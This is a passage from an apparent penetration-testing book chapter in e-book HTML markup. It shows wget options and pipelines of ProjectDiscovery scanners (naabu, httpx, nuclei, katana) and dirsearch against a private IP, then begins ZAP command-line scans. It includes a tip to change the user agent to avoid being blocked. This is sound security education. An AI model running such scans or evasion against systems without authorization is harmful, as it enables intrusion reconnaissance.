    <strong class="source-inline">
     <span class="koboSpan" id="kobo.523.1">
      -p
     </span>
    </strong>
    <span class="koboSpan" id="kobo.524.1">
     (page requisites) options.
    </span>
    <span class="koboSpan" id="kobo.524.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.525.1">
      -k
     </span>
    </strong>
    <span class="koboSpan" id="kobo.526.1">
     option converts the links to be suitable for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.527.1">
      local viewing:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.528.1">
$ wget -r -p -k http://example.com/</span></pre>
   <p>
    <span class="koboSpan" id="kobo.529.1">
     You can limit the download speed using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.530.1">
      --
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.531.1">
       limit-rate
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.532.1">
      option:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.533.1">
$ wget --limit-rate=100k http://example.com/file.zip</span></pre>
   <p>
    <span class="koboSpan" id="kobo.534.1">
     You can download files with a specific file extension using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.535.1">
      -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.536.1">
       A
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.537.1">
      option:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.538.1">
$ wget -r -A pdf http://example.com/</span></pre>
   <p>
    <span class="koboSpan" id="kobo.539.1">
     In this section, you learned the most commonly used
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.540.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.541.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.542.1">
      wget
     </span>
    </strong>
    <span class="koboSpan" id="kobo.543.1">
     options and examined common uses.
    </span>
    <span class="koboSpan" id="kobo.543.2">
     Using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.544.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.545.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.546.1">
      wget
     </span>
    </strong>
    <span class="koboSpan" id="kobo.547.1">
     in Bash scripts allows pentesters to interact with web applications efficiently, sending customized requests to identify and exploit vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.547.2">
     Mastering these options and techniques is essential for effective web
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.548.1">
      application pentesting.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.549.1">
     The next section will show how to use more advanced web application pentesting tools that you can use in the Bash shell, such as various ProjectDiscovery tools, as well as running command-line
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.550.1">
      ZAP scans.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-155">
    <a id="_idTextAnchor247">
    </a>
    <span class="koboSpan" id="kobo.551.1">
     Analyzing web application security with Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.552.1">
     This section will examine
    </span>
    <a id="_idIndexMarker529">
    </a>
    <span class="koboSpan" id="kobo.553.1">
     common command-line tools that you should have in your toolbox for web application
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.554.1">
      security testing.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-156">
    <a id="_idTextAnchor248">
    </a>
    <span class="koboSpan" id="kobo.555.1">
     ProjectDiscovery
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.556.1">
     ProjectDiscovery maintains a
    </span>
    <a id="_idIndexMarker530">
    </a>
    <span class="koboSpan" id="kobo.557.1">
     variety of command-line tools you can run in your Bash shell.
    </span>
    <span class="koboSpan" id="kobo.557.2">
     They’re designed to accept input and pass output via the shell pipeline, allowing you to chain together multiple tools.
    </span>
    <span class="koboSpan" id="kobo.557.3">
     Their most popular tools include
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.558.1">
      the following:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.559.1">
       nuclei
      </span>
     </strong>
     <span class="koboSpan" id="kobo.560.1">
      : An open source vulnerability scanner that uses
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.561.1">
       YAML templates
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.562.1">
       nuclei-templates
      </span>
     </strong>
     <span class="koboSpan" id="kobo.563.1">
      : Templates for the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.564.1">
       nuclei
      </span>
     </strong>
     <span class="koboSpan" id="kobo.565.1">
      engine to find
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.566.1">
       security vulnerabilities
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.567.1">
       subfinder
      </span>
     </strong>
     <span class="koboSpan" id="kobo.568.1">
      : A passive subdomain
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.569.1">
       enumeration tool
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.570.1">
       httpx
      </span>
     </strong>
     <span class="koboSpan" id="kobo.571.1">
      : An HTTP toolkit that allows running sending probes to identify
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.572.1">
       HTTP services
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.573.1">
       cvemap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.574.1">
      : A CLI to search
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.575.1">
       for CVE
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.576.1">
       katana
      </span>
     </strong>
     <span class="koboSpan" id="kobo.577.1">
      : A web crawling and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.578.1">
       spidering framework
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.579.1">
       naabu
      </span>
     </strong>
     <span class="koboSpan" id="kobo.580.1">
      : A port scanner that integrates easily with other
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.581.1">
       ProjectDiscovery tools
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.582.1">
       mapcidr
      </span>
     </strong>
     <span class="koboSpan" id="kobo.583.1">
      : A utility program to perform multiple operations for a given
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.584.1">
       subnet/CIDR range
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.585.1">
     You can find the ProjectDiscovery tools
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.586.1">
      at
     </span>
    </span>
    <a href="https://github.com/projectdiscovery">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.587.1">
       https://github.com/projectdiscovery
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.588.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.589.1">
     An example workflow combining these tools would start with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.590.1">
      mapcidr
     </span>
    </strong>
    <span class="koboSpan" id="kobo.591.1">
     to expand a network address into individual IP addresses, piped to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.592.1">
      naabu
     </span>
    </strong>
    <span class="koboSpan" id="kobo.593.1">
     to scan for open ports, piped to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.594.1">
      httpx
     </span>
    </strong>
    <span class="koboSpan" id="kobo.595.1">
     to discover web services, and piped to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.596.1">
      nuclei
     </span>
    </strong>
    <span class="koboSpan" id="kobo.597.1">
     to test for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.598.1">
      known vulnerabilities.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.599.1">
     Let’s examine some of these tools individually before experimenting with how they can be used together in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.600.1">
      a chain.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.601.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.602.1">
      mapcidr
     </span>
    </strong>
    <span class="koboSpan" id="kobo.603.1">
     tool accepts input via
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.604.1">
      stdin
     </span>
    </strong>
    <span class="koboSpan" id="kobo.605.1">
     .
    </span>
    <span class="koboSpan" id="kobo.605.2">
     Here’s an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.606.1">
      example usage:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.607.1">
$ echo 10.2.10.0/24 | mapcidr -silent</span></pre>
   <p>
    <span class="koboSpan" id="kobo.608.1">
     Example output is
    </span>
    <a id="_idIndexMarker531">
    </a>
    <span class="koboSpan" id="kobo.609.1">
     shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.610.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer098">
     <span class="koboSpan" id="kobo.611.1">
      <img alt="Figure 9.6 – An example of mapcidr usage" src="image/B22229_09_06.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.612.1">
     Figure 9.6 – An example of mapcidr usage
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.613.1">
     In the preceding figure, I use the Bash shell pipe (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.614.1">
      |
     </span>
    </strong>
    <span class="koboSpan" id="kobo.615.1">
     ) operator to pass the network address to the input of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.616.1">
      mapcidr
     </span>
    </strong>
    <span class="koboSpan" id="kobo.617.1">
     tool.
    </span>
    <span class="koboSpan" id="kobo.617.2">
     The output contains the network address expanded to individual
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.618.1">
      IP addresses.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.619.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.620.1">
     By default, all ProjectDiscovery tools output a banner.
    </span>
    <span class="koboSpan" id="kobo.620.2">
     Since we’ll be piping the output of each tool to the input of the next tool, this is undesired behavior.
    </span>
    <span class="koboSpan" id="kobo.620.3">
     Include the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.621.1">
      -silent
     </span>
    </strong>
    <span class="koboSpan" id="kobo.622.1">
     option with the ProjectDiscovery tools to suppress
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.623.1">
      the banner.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.624.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.625.1">
      naabu
     </span>
    </strong>
    <span class="koboSpan" id="kobo.626.1">
     tool is a ProjectDiscovery tool that scans for open ports.
    </span>
    <span class="koboSpan" id="kobo.626.2">
     You can include command-line options that follow up on each open port with an
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.627.1">
      nmap
     </span>
    </strong>
    <span class="koboSpan" id="kobo.628.1">
     scan, in addition to a large list of other options.
    </span>
    <span class="koboSpan" id="kobo.628.2">
     Where
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.629.1">
      naabu
     </span>
    </strong>
    <span class="koboSpan" id="kobo.630.1">
     becomes helpful is its ability to fit in a command pipeline, piping the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.631.1">
      stdout
     </span>
    </strong>
    <span class="koboSpan" id="kobo.632.1">
     of one ProjectDiscovery tool to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.633.1">
      stdin
     </span>
    </strong>
    <span class="koboSpan" id="kobo.634.1">
     of the next.
    </span>
    <span class="koboSpan" id="kobo.634.2">
     In its default configuration,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.635.1">
      naabu
     </span>
    </strong>
    <span class="koboSpan" id="kobo.636.1">
     scans a limited number of ports.
    </span>
    <span class="koboSpan" id="kobo.636.2">
     However, command-line options include the ability to specify a list or range
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.637.1">
      of ports:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer099">
     <span class="koboSpan" id="kobo.638.1">
      <img alt="Figure 9.7 – An example naabu port scan is executed" src="image/B22229_09_07.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.639.1">
     Figure 9.7 – An example naabu port scan is executed
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.640.1">
     The ProjectDiscovery
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.641.1">
      httpx
     </span>
    </strong>
    <span class="koboSpan" id="kobo.642.1">
     tool probes open
    </span>
    <a id="_idIndexMarker532">
    </a>
    <span class="koboSpan" id="kobo.643.1">
     ports for listening
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.644.1">
      HTTP servers:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer100">
     <span class="koboSpan" id="kobo.645.1">
      <img alt="Figure 9.8 – An example httpx scan is executed" src="image/B22229_09_08.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.646.1">
     Figure 9.8 – An example httpx scan is executed
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.647.1">
     In the preceding figure, I use the Bash shell pipe (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.648.1">
      |
     </span>
    </strong>
    <span class="koboSpan" id="kobo.649.1">
     ) operator to send the IP address
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.650.1">
      10.2.10.1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.651.1">
     to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.652.1">
      naabu
     </span>
    </strong>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.653.1">
      stdin
     </span>
    </strong>
    <span class="koboSpan" id="kobo.654.1">
     input.
    </span>
    <span class="koboSpan" id="kobo.654.2">
     I include the silent option (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.655.1">
      -silent
     </span>
    </strong>
    <span class="koboSpan" id="kobo.656.1">
     ) to suppress banner output, followed by a list of ports (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.657.1">
      -p
     </span>
    </strong>
    <span class="koboSpan" id="kobo.658.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.658.2">
     The output is piped to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.659.1">
      httpx
     </span>
    </strong>
    <span class="koboSpan" id="kobo.660.1">
     tool using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.661.1">
      -silent
     </span>
    </strong>
    <span class="koboSpan" id="kobo.662.1">
     option.
    </span>
    <span class="koboSpan" id="kobo.662.2">
     The output of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.663.1">
      https
     </span>
    </strong>
    <span class="koboSpan" id="kobo.664.1">
     is a list of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.665.1">
      HTTP URLs.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.666.1">
     The ProjectDiscovery
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.667.1">
      nuclei
     </span>
    </strong>
    <span class="koboSpan" id="kobo.668.1">
     tool scans for known vulnerabilities and misconfigurations.
    </span>
    <span class="koboSpan" id="kobo.668.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.669.1">
      nuclei
     </span>
    </strong>
    <span class="koboSpan" id="kobo.670.1">
     templates also include
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.671.1">
      fuzzing
     </span>
    </em>
    <span class="koboSpan" id="kobo.672.1">
     templates that scan for unknown vulnerabilities belonging to common vulnerability
    </span>
    <a id="_idIndexMarker533">
    </a>
    <span class="koboSpan" id="kobo.673.1">
     classes such as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.674.1">
      cross-site scripting
     </span>
    </strong>
    <span class="koboSpan" id="kobo.675.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.676.1">
      XSS
     </span>
    </strong>
    <span class="koboSpan" id="kobo.677.1">
     )
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.678.1">
      and SQLi.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.679.1">
     The following figure demonstrates a
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.680.1">
       nuclei
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.681.1">
      scan:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer101">
     <span class="koboSpan" id="kobo.682.1">
      <img alt="Figure 9.9 – An example nuclei scan is executed in a piped command" src="image/B22229_09_09.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.683.1">
     Figure 9.9 – An example nuclei scan is executed in a piped command
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.684.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.685.1">
     ProjectDiscovery tools have far more capability than I’ve shown here.
    </span>
    <span class="koboSpan" id="kobo.685.2">
     You really should take the time to explore the documentation.
    </span>
    <span class="koboSpan" id="kobo.685.3">
     These tools are an important part of any pentester or bug bounty
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.686.1">
      hunter’s toolbox.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.687.1">
     The ProjectDiscovery
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.688.1">
      katana
     </span>
    </strong>
    <span class="koboSpan" id="kobo.689.1">
     tool crawls or spiders web applications and prints discovered URLs.
    </span>
    <span class="koboSpan" id="kobo.689.2">
     The following figure demonstrates using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.690.1">
      katana
     </span>
    </strong>
    <span class="koboSpan" id="kobo.691.1">
     tool to crawl
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.692.1">
      a website:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer102">
     <span class="koboSpan" id="kobo.693.1">
      <img alt="Figure 9.10 – The katana tool is used to crawl a website" src="image/B22229_09_10.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.694.1">
     Figure 9.10 – The katana tool is used to crawl a website
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.695.1">
     In the next figure, I demonstrate
    </span>
    <a id="_idIndexMarker534">
    </a>
    <span class="koboSpan" id="kobo.696.1">
     piping output (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.697.1">
      |
     </span>
    </strong>
    <span class="koboSpan" id="kobo.698.1">
     ) from a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.699.1">
      katana
     </span>
    </strong>
    <span class="koboSpan" id="kobo.700.1">
     crawl to a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.701.1">
      nuclei
     </span>
    </strong>
    <span class="koboSpan" id="kobo.702.1">
     scan using the fuzzing templates (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.703.1">
      -dast
     </span>
    </strong>
    <span class="koboSpan" id="kobo.704.1">
     option).
    </span>
    <span class="koboSpan" id="kobo.704.2">
     An XSS vulnerability is detected and displayed in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.705.1">
      tool output:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer103">
     <span class="koboSpan" id="kobo.706.1">
      <img alt="Figure 9.11 – Katana output is piped to a nuclei scan" src="image/B22229_09_11.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.707.1">
     Figure 9.11 – Katana output is piped to a nuclei scan
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.708.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.709.1">
     When running tools in the Bash shell that connect to websites, always change the user agent, as shown in the preceding figures.
    </span>
    <span class="koboSpan" id="kobo.709.2">
     You’ll frequently get blocked if you use the default
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.710.1">
      user agent.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.711.1">
     Of course, you’re not limited to piping the ProjectDiscovery tool output to other ProjectDiscovery tools.
    </span>
    <span class="koboSpan" id="kobo.711.2">
     This command uses the Bash pipe to send
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.712.1">
      httpx
     </span>
    </strong>
    <span class="koboSpan" id="kobo.713.1">
     output to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.714.1">
      dirsearch
     </span>
    </strong>
    <span class="koboSpan" id="kobo.715.1">
     to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.716.1">
      discover content:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.717.1">
$ echo 10.2.10.1 | naabu -silent -p 4712,5005,5555,8080,8090,8111 | httpx -silent | dirsearch --stdin --full-url -q -o dirsearch.csv --format=csv</span></pre>
   <p>
    <span class="koboSpan" id="kobo.718.1">
     Let’s look at
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.719.1">
      the explanation:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.720.1">
      As before, I echo the
     </span>
     <a id="_idIndexMarker535">
     </a>
     <span class="koboSpan" id="kobo.721.1">
      IP address and pipe it to the input to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.722.1">
       naabu
      </span>
     </strong>
     <span class="koboSpan" id="kobo.723.1">
      with the silent option and a list
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.724.1">
       of ports
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.725.1">
      The output of the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.726.1">
       naabu
      </span>
     </strong>
     <span class="koboSpan" id="kobo.727.1">
      port scan is piped
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.728.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.729.1">
        httpx
       </span>
      </strong>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.730.1">
      The URL’s output from
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.731.1">
       httpx
      </span>
     </strong>
     <span class="koboSpan" id="kobo.732.1">
      is piped to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.733.1">
       dirsearch
      </span>
     </strong>
     <span class="koboSpan" id="kobo.734.1">
      for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.735.1">
       content discovery
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.736.1">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.737.1">
       dirsearch
      </span>
     </strong>
     <span class="koboSpan" id="kobo.738.1">
      options accept input from
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.739.1">
       stdin
      </span>
     </strong>
     <span class="koboSpan" id="kobo.740.1">
      (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.741.1">
       --stdin
      </span>
     </strong>
     <span class="koboSpan" id="kobo.742.1">
      ), output the full URL (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.743.1">
       --full-url
      </span>
     </strong>
     <span class="koboSpan" id="kobo.744.1">
      ), suppress printing any banners (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.745.1">
       -q
      </span>
     </strong>
     <span class="koboSpan" id="kobo.746.1">
      ), and save the output (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.747.1">
       -o
      </span>
     </strong>
     <span class="koboSpan" id="kobo.748.1">
      ) to a file in CSV
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.749.1">
       format (
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.750.1">
        --format=csv
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.751.1">
       )
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.752.1">
     An
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.753.1">
      awk
     </span>
    </strong>
    <span class="koboSpan" id="kobo.754.1">
     filter I commonly use to show only 200 or 302 responses from the CSV file uses a comma field separator (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.755.1">
      -F','
     </span>
    </strong>
    <span class="koboSpan" id="kobo.756.1">
     ) and filters the second field for 200 or 302 responses is shown
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.757.1">
      as follows:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.758.1">
$ awk -F',' '$2 == 200 || $2 == 302 {print $0}' dirsearch.csv</span></pre>
   <p>
    <span class="koboSpan" id="kobo.759.1">
     The ProjectDiscovery tools are great for discovering known vulnerabilities and misconfigurations.
    </span>
    <span class="koboSpan" id="kobo.759.2">
     A recent update extended
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.760.1">
      nuclei
     </span>
    </strong>
    <span class="koboSpan" id="kobo.761.1">
     ’s ability to fuzz for vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.761.2">
     However, for more thorough web application vulnerability scans, I would recommend using ZAP.
    </span>
    <span class="koboSpan" id="kobo.761.3">
     Think of these tools as complementary.
    </span>
    <span class="koboSpan" id="kobo.761.4">
     Let’s move forward and explore
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.762.1">
      ZAP scans.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-157">
    <a id="_idTextAnchor249">
    </a>
    <span class="koboSpan" id="kobo.763.1">
     Running command-line scans with ZAP
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.764.1">
     ZAP is a web application vulnerability
    </span>
    <a id="_idIndexMarker536">
    </a>
    <span class="koboSpan" id="kobo.765.1">
     scanner and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.766.1">
      browser proxy.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.767.1">
     The GUI component of ZAP can be started
    </span>
    <a id="_idIndexMarker537">
    </a>
    <span class="koboSpan" id="kobo.768.1">
     from the GUI system menu or the terminal with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.769.1">
      zaproxy
     </span>
    </strong>
    <span class="koboSpan" id="kobo.770.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.770.2">
     However, this section will focus on
    </span>
    <a id="_idIndexMarker538">
    </a>
    <span class="koboSpan" id="kobo.771.1">
     running the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.772.1">
      /usr/share/zaproxy/zap.sh
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.773.1">
      command-line scanner.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.774.1">
     Enter this command in your Bash terminal to examine ZAP
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.775.1">
      command-line options:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.776.1">
$ /usr/share/zaproxy/zap.sh -h</span></pre>
   <p>
    <span class="koboSpan" id="kobo.777.1">
     One of the commands I run at the beginning of any web application pentest is
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.778.1">
      zapit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.779.1">
     .
    </span>
    <span class="koboSpan" id="kobo.779.2">
     This performs a quick reconnaissance scan.
    </span>
    <span class="koboSpan" id="kobo.779.3">
     The output lists important details about the web application.
    </span>
    <span class="koboSpan" id="kobo.779.4">
     Before running
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.780.1">
      zapit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.781.1">
     , you must install the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.782.1">
      wappalyzer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.783.1">
     add-on using the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.784.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.785.1">
$ /usr/share/zaproxy/zap.sh -cmd -addoninstall wappalyzer</span></pre>
   <p>
    <span class="koboSpan" id="kobo.786.1">
     You need to run the
    </span>
    <a id="_idIndexMarker539">
    </a>
